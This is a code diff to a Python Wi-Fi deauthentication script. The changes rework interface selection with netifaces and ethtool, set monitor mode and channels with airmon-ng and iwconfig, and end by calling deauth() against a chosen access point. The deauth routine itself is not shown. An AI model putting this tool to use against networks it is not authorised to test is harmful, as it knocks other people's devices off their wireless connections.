@@ -2,6 +2,7 @@
 import subprocess, os, re, csv
 import time, multiprocessing
 from colorama import Fore
+import netifaces
 
 active_wireless_networks = []
 wlan_pattern = re.compile("^wlan[0-9]+")
@@ -29,24 +30,25 @@ def start_info():
     print(f"{Fore.GREEN}[*]{Fore.RESET} Creator : {Fore.BLUE}Dx4{Fore.RESET}")
 
 def select_interface():
-    list_interface = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
-    if len(list_interface) == 0:
-        print(f"{Fore.RED}No interface detected")
+    interfaces = netifaces.interfaces()
+    wireless_interfaces = [interface for interface in interfaces if wlan_pattern.match(interface)]
+    if len(wireless_interfaces) == 0:
+        print(f"{Fore.RED}No wireless interface detected.")
         exit()
-    print(f"{Fore.YELLOW}[*]{Fore.RESET} Select interface available:")
-    for index, item in enumerate(list_interface):
-        print(f"  {Fore.YELLOW}[{index}]{Fore.RESET} - {item}")
+    print(f"{Fore.YELLOW}[*]{Fore.RESET} Select wireless interface:")
+    for index, interface in enumerate(wireless_interfaces):
+        driver_info = subprocess.run(["sudo", "ethtool", "-i", interface], capture_output=True, text=True).stdout
+        driver = re.search(r"driver:\s*(\S+)", driver_info).group(1)
+        print(f"  {Fore.YELLOW}[{index}]{Fore.RESET} - {interface} ({driver})")
     selected = input(f"{Fore.YELLOW}[*]{Fore.RESET} Select: ")
-    if not selected == "" and int(selected) < len(list_interface):
-        return list_interface[int(selected)]
+    if selected.isdigit() and int(selected) < len(wireless_interfaces):
+        return wireless_interfaces[int(selected)]
     else:
-        print(f"[*] Invalid selection!")
+        print(f"{Fore.RED}Invalid selection!")
         exit()
 
+
 def change_mode(intf):
-    # print(f"{Fore.BLUE}[*]{Fore.RESET} Kill conflicting procesess...")
-    # change_mode = subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
     print(f"{Fore.BLUE}[*]{Fore.RESET} Changing {intf} to monitor mode...")
     change_mode = subprocess.run(["sudo", "airmon-ng", "start", intf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -55,7 +57,7 @@ def fixchannel(cha):
 
 def set_channel(intf, ch):    
     print(f"{Fore.BLUE}[*]{Fore.RESET} Changing {intf} channel to {fixchannel(ch)}...")
-    change_mode = subprocess.run(["sudo", "airmon-ng", "start", intf, fixchannel(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    change_mode = subprocess.run(["sudo", "iwconfig", intf, "channel", fixchannel(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def read_csv():
     for file_name in os.listdir():
@@ -126,5 +128,3 @@ if __name__ == "__main__":
     set_channel(interface, active_wireless_networks[select_bssid]['channel'])
 
     deauth(interface, active_wireless_networks[select_bssid]['BSSID'])
-
-
